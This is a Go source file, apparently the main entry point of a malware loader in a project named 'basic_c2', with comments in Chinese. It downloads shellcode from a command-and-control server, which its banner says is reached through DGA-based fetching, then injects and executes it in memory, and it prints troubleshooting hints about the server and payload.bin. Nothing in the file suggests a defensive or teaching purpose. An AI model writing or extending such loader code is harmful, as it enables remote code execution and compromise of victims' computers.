package main

import (
	"basic_c2/loader/fetch"
	"basic_c2/loader/inject"
	"fmt"
	"time"
)

func main() {
	fmt.Println("======== [Loader: DGA Payload Fetching] ========")

	// 1. 下载 Payload
	shellcode, err := fetch.FetchPayload()
	if err != nil {
		fmt.Printf("[!] 下载失败: %v\n", err)
		fmt.Println("[!] 请检查: 1. Server是否启动 2. payload.bin是否上传")
		time.Sleep(5 * time.Second)
		return
	}

	// 2. 注入并执行
	if err := inject.Execute(shellcode); err != nil {
		fmt.Printf("[!] 执行失败: %v\n", err)
		time.Sleep(5 * time.Second)
		return
	}
}
